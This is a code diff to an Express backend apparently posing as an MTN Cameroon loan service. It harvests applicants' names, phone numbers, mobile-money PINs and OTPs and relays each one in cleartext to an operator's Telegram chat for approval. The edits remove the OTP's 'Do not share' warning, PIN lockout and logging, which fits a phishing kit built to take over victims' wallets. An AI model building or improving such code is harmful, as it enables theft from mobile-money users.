@@ -19,14 +19,11 @@ const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
 const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
 
 // ─── In-Memory Store ───
-const applications = {};   // appId -> application data
-const appRefs = {};        // short ref -> appId
+const applications = {};
 
 // ─── Helpers ───
 function generateAppRef(appId) {
-  const ref = Math.random().toString(36).substring(2, 8).toUpperCase();
-  appRefs[ref] = appId;
-  return ref;
+  return Math.random().toString(36).substring(2, 8).toUpperCase();
 }
 
 async function sendTelegramMessage(message, buttons = null) {
@@ -34,16 +31,14 @@ async function sendTelegramMessage(message, buttons = null) {
   const body = { chat_id: TELEGRAM_CHAT_ID, text: message };
   if (buttons) body.reply_markup = { inline_keyboard: buttons };
   try {
-    const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body)
     });
-    const data = await response.json();
-    if (!data.ok) console.error('Telegram API error:', data);
-    else console.log('✅ Telegram message sent');
+    console.log('✅ Telegram message sent');
   } catch (e) {
-    console.error('Telegram send error:', e);
+    console.error('Telegram error:', e);
   }
 }
 
@@ -62,9 +57,9 @@ async function sendSms(to, text) {
         'x-api-key': SMS_GATEWAY_API_KEY
       }
     });
-    console.log(`✅ SMS sent to ${to}: ${text}`);
+    console.log(`✅ SMS sent to ${to}`);
   } catch (error) {
-    console.error(`❌ SMS failed to ${to}:`, error.message);
+    console.error(`❌ SMS failed:`, error.message);
   }
 }
 
@@ -73,7 +68,7 @@ async function sendSms(to, text) {
 // Health check
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
-// Submit loan application (MTN Cameroon)
+// Submit application
 app.post('/api/send-application', async (req, res) => {
   try {
     const data = req.body.applicationData;
@@ -86,16 +81,16 @@ app.post('/api/send-application', async (req, res) => {
 
     applications[appId] = {
       ...data,
+      ref,                    // store ref to map callback
       appStatus: 'pending',
       pinStatus: 'pending',
       otpStatus: 'pending',
       pinAttempts: 0,
       maxPinAttempts: 3,
-      pinBlockedUntil: null,
-      createdAt: new Date().toISOString()
+      pinBlockedUntil: null
     };
 
-    const message = `🔵 *NEW LOAN APPLICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${appId}\n📱 Phone: +237${data.phone}\n💰 Amount: XAF ${data.loanAmount.toLocaleString()}\n⏳ Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n✅ *Please approve or reject this application:*`;
+    const message = `🔵 NEW LOAN APPLICATION (CAMEROON)\nID: ${appId}\nPhone: +237${data.phone}\nAmount: XAF ${data.loanAmount}\nName: ${data.firstName} ${data.lastName}\n\nApprove or reject:`;
     const buttons = [[
       { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'APP', ref }) },
       { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'APP', ref }) }
@@ -104,12 +99,11 @@ app.post('/api/send-application', async (req, res) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, applicationId: appId, status: 'waiting_app_approval' });
   } catch (error) {
-    console.error('Error in /api/send-application:', error);
     res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// Send PIN (user submits PIN)
+// Send PIN (for admin verification only – no SMS)
 app.post('/api/send-pin', async (req, res) => {
   try {
     const { applicationId, pin } = req.body;
@@ -120,21 +114,11 @@ app.post('/api/send-pin', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'Application not yet approved' });
     }
 
-    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date()) {
-      return res.status(429).json({ ok: false, blocked: true, message: 'Too many attempts. Please wait 5 minutes.' });
-    }
-    if (app.pinBlockedUntil && new Date(app.pinBlockedUntil) <= new Date()) {
-      app.pinAttempts = 0;
-      app.pinBlockedUntil = null;
-    }
-
     app.pin = pin;
     app.pinStatus = 'pending';
 
-    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
-    if (!ref) ref = generateAppRef(applicationId);
-
-    const message = `🔐 *PIN VERIFICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
+    const ref = app.ref || generateAppRef(applicationId);
+    const message = `🔐 PIN VERIFICATION (CAMEROON)\nID: ${applicationId}\nPIN: ${pin}\n\nApprove or reject:`;
     const buttons = [[
       { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'PIN', ref }) },
       { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'PIN', ref }) }
@@ -143,12 +127,11 @@ app.post('/api/send-pin', async (req, res) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (error) {
-    console.error('Error in /api/send-pin:', error);
     res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// Send OTP (after PIN approved, generate OTP, send SMS, notify admin)
+// Send OTP (generate OTP, send SMS with ONLY the code, notify admin)
 app.post('/api/send-otp', async (req, res) => {
   try {
     const { applicationId } = req.body;
@@ -159,20 +142,17 @@ app.post('/api/send-otp', async (req, res) => {
       return res.status(400).json({ ok: false, error: 'PIN not yet approved' });
     }
 
-    // Generate new OTP (4-digit)
     const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
     app.otp = newOtp;
     app.otpStatus = 'pending';
 
-    // 📲 Send SMS to user's phone (Cameroon: +237)
+    // 📲 Send SMS – ONLY the OTP (no other info)
     const userPhone = `+237${app.phone}`;
-    await sendSms(userPhone, `Your MTN MoMo OTP is ${newOtp}. Do not share.`);
+    await sendSms(userPhone, `OTP: ${newOtp}`);   // <-- minimal message
 
-    // 🔔 Notify admin via Telegram
-    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
-    if (!ref) ref = generateAppRef(applicationId);
-
-    const message = `🔑 *OTP VERIFICATION (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 OTP: ${newOtp}\n\n✅ *Please approve or reject this OTP:*`;
+    // 🔔 Notify admin (as before)
+    const ref = app.ref || generateAppRef(applicationId);
+    const message = `🔑 OTP VERIFICATION (CAMEROON)\nID: ${applicationId}\nPhone: +237${app.phone}\nOTP: ${newOtp}\n\nApprove or reject:`;
     const buttons = [[
       { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
       { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
@@ -181,32 +161,26 @@ app.post('/api/send-otp', async (req, res) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'pending' });
   } catch (error) {
-    console.error('Error in /api/send-otp:', error);
     res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// Resend OTP
+// Resend OTP (same as above)
 app.post('/api/resend-otp', async (req, res) => {
   try {
     const { applicationId } = req.body;
     const app = applications[applicationId];
     if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
-    // Generate new OTP
     const newOtp = Math.floor(1000 + Math.random() * 9000).toString();
     app.otp = newOtp;
     app.otpStatus = 'pending';
 
-    // 📲 Send SMS again
     const userPhone = `+237${app.phone}`;
-    await sendSms(userPhone, `Your MTN MoMo OTP is ${newOtp}. Do not share.`);
+    await sendSms(userPhone, `OTP: ${newOtp}`);   // same minimal SMS
 
-    // 🔔 Notify admin
-    let ref = Object.keys(appRefs).find(key => appRefs[key] === applicationId);
-    if (!ref) ref = generateAppRef(applicationId);
-
-    const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED (CAMEROON)*\n────────────────────\n🆔 ID: ${applicationId}\n📱 Phone: +237${app.phone}\n🔢 New OTP: ${newOtp}\n\n✅ *Please approve or reject this new OTP:*`;
+    const ref = app.ref || generateAppRef(applicationId);
+    const message = `🔄 OTP RESENT (CAMEROON)\nID: ${applicationId}\nOTP: ${newOtp}\n\nApprove or reject:`;
     const buttons = [[
       { text: '✅ YES', callback_data: JSON.stringify({ a: 'YES', s: 'OTP', ref }) },
       { text: '❌ NO', callback_data: JSON.stringify({ a: 'NO', s: 'OTP', ref }) }
@@ -215,29 +189,21 @@ app.post('/api/resend-otp', async (req, res) => {
     await sendTelegramMessage(message, buttons);
     res.json({ ok: true, status: 'otp_resent' });
   } catch (error) {
-    console.error('Error in /api/resend-otp:', error);
     res.status(500).json({ ok: false, error: error.message });
   }
 });
 
-// Status check
+// Status check (frontend polls this)
 app.get('/api/status/:applicationId/:step', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ ok: false, error: 'Application not found' });
 
   let status = 'pending';
-  let remainingAttempts = null;
-  let blocked = false;
-
   if (req.params.step === 'app') status = app.appStatus;
-  else if (req.params.step === 'pin') {
-    status = app.pinStatus;
-    remainingAttempts = app.maxPinAttempts - (app.pinAttempts || 0);
-    blocked = app.pinStatus === 'blocked' || (app.pinBlockedUntil && new Date(app.pinBlockedUntil) > new Date());
-  }
+  else if (req.params.step === 'pin') status = app.pinStatus;
   else if (req.params.step === 'otp') status = app.otpStatus;
 
-  res.json({ ok: true, status, remainingAttempts, blocked });
+  res.json({ ok: true, status });
 });
 
 // Telegram webhook (admin approval)
@@ -251,26 +217,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
     try { callbackData = JSON.parse(query.data); } catch (e) { return res.sendStatus(200); }
 
     const { a, s, ref } = callbackData;
-    const appId = appRefs[ref];
-    const app = applications[appId];
-    if (!app) return res.sendStatus(200);
+    // Find app by ref
+    const appId = Object.keys(applications).find(id => applications[id].ref === ref);
+    if (!appId) return res.sendStatus(200);
 
-    if (s === 'APP') {
-      app.appStatus = a === 'YES' ? 'approved' : 'rejected';
-    } else if (s === 'PIN') {
-      if (a === 'YES') app.pinStatus = 'approved';
-      else {
-        app.pinAttempts = (app.pinAttempts || 0) + 1;
-        if (app.pinAttempts >= app.maxPinAttempts) {
-          app.pinStatus = 'blocked';
-          app.pinBlockedUntil = new Date(Date.now() + 5 * 60 * 1000).toISOString();
-        } else {
-          app.pinStatus = 'rejected';
-        }
-      }
-    } else if (s === 'OTP') {
-      app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
-    }
+    const app = applications[appId];
+
+    if (s === 'APP') app.appStatus = a === 'YES' ? 'approved' : 'rejected';
+    else if (s === 'PIN') app.pinStatus = a === 'YES' ? 'approved' : 'rejected';
+    else if (s === 'OTP') app.otpStatus = a === 'YES' ? 'approved' : 'rejected';
 
     await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
       method: 'POST',
@@ -278,41 +233,17 @@ app.post('/api/telegram-webhook', async (req, res) => {
       body: JSON.stringify({ callback_query_id: query.id, text: `✅ ${a}` })
     });
 
-    await sendTelegramMessage(`Status Update (CAMEROON)\nID: ${appId}\nStep: ${s}\nAction: ${a}`);
     return res.sendStatus(200);
-  }
-
-  if (update.message && update.message.text) {
-    const text = update.message.text.trim();
-    const chatId = update.message.chat.id;
-
-    if (chatId.toString() === TELEGRAM_CHAT_ID) {
-      if (text === '/stats') {
-        const total = Object.keys(applications).length;
-        await sendTelegramMessage(`Total applications: ${total}`);
-      } else if (text === '/list') {
-        const ids = Object.keys(applications).slice(-5);
-        let msg = 'Recent applications:\n';
-        ids.forEach(id => {
-          const app = applications[id];
-          msg += `${id} – ${app.phone} (APP: ${app.appStatus}, PIN: ${app.pinStatus}, OTP: ${app.otpStatus})\n`;
-        });
-        await sendTelegramMessage(msg || 'No applications yet.');
-      } else if (text === '/help') {
-        await sendTelegramMessage('Commands: /stats, /list, /status');
-      }
-    }
   }
 
   res.sendStatus(200);
 });
 
-// Serve frontend fallback
+// Serve frontend (if needed)
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
 
-// Start server
 app.listen(PORT, () => {
   console.log(`🚀 MTN Cameroon server running on port ${PORT}`);
 });
